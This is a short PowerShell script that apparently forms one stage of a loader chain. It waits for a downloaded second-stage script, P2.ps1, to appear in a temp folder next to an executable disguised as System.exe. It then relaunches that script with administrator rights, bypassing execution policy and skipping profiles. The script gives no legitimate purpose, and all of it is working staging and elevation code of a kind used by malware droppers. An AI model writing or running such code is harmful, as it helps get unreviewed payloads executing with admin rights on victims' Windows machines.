$ErrorActionPreference = "Stop"
$tempDir = "$env:TEMP\rt"
$ps2Path = "$tempDir\P2.ps1"
$exePath = "$tempDir\System.exe"

# Wait for files to exist (max 30 seconds)
$timeout = 30
while (-not (Test-Path $ps2Path) -and $timeout -gt 0) {
    Start-Sleep -Seconds 1
    $timeout--
}

if (-not (Test-Path $ps2Path)) {
    Write-Error "Download failed"
    exit 1
}

# Elevate
Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$ps2Path`"" -Wait